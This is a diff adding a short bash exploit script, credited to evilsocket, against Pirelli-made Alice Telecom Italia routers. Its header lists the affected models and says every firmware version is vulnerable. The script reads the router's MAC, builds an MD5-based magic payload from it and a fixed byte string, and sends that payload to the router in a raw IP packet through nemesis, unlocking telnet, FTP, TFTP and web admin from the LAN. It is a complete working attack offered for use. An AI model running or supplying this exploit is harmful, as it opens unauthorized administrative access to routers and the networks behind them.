@@ -1,0 +1,27 @@
+#!/bin/bash
+# AliceFuck written by evilsocket (evilsocket@gmail.com) http://www.evilsocket.net/
+# Based on the work of saxdax & drpepperONE
+#
+# Router Vendor    : Alice Telecom Italia CPE Modem/Routers manufactered by Pirelli
+#                    based on Broadcom platform.
+#
+# Model Affected   : AGA[Alice Gate2 plus Wi-Fi]/AGB[Alice Gate2plus]AG2P-AG3[Alice Gate W2+]
+#                    /AGPV-AGPF[Alice Gate VoIP 2 Plus Wi-Fi]
+#
+# Firmware Version : All AGA/AGB/AG2P-AG3/AGPV-AGPF firmware version are affected.
+#
+# Platforms        : Customized Linux version 2.6.8.1 on BroadcomBCM96348 chipset.
+#
+# Vulnerability    : enable telnet/ftp/tftp and web-admin frominternal lan.
+#
+# Exploitation     : internal network lan, versus Router
+
+RAWMAC=`sudo arping -I eth0 -f -c 2 192.168.1.1 | awk '/\[(.+)\]/ { print $5; }' |  sed 's/\[/\\\x/g' | sed 's/\]//g' | sed 's/\:/\\\x/g'`
+MD5PAYLOAD=`printf "$RAWMAC\x04\x07\x67\x10\x02\x81\xFA\x66\x11\x41\x68\x11\x17\x01\x05\x22\x71\x04\x10\x33" | md5sum | cut -b-16`
+FINAL=
+for ((i=0;i<=15;i+=2)); do 	
+FINAL="${FINAL}\\x${MD5PAYLOAD:$i:2}" 
+done
+printf "$FINAL" > payload.raw
+sudo nemesis ip -D 192.168.1.1 -p 255 -P payload.raw > /dev/null
+rm payload.raw
